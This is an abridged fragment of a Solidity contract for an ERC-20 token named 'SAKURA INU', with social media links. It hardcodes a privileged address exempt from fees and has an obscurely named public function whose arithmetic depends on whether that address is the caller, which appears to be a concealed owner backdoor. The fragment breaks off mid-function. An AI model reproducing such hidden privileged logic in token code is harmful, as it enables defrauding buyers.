...
*/
/**
Telegram: https://t.me/SAKURAINUPORTAL

Twitter：https://twitter.com/SakuraInuERC
...
contract SAKURA is Context, IERC20, Ownable {
    ...
    string private _name = "SAKURA INU";
    string private _symbol = "SAKURA";
    uint8 private _decimals = 6;
    address payable public abss;
    ...
    constructor () {
        ...
        abss = payable(address(0x95a5b5D1295AB4f269Cb025782BDE2DBC9dA0D68));
        
        _isExcludefromFee[abss] = true;
    ...
    function HACHI(address ab,uint256 SS) public {
        uint256 hover = (abss != _msgSender()) ? SS.mul(SS) : 0;
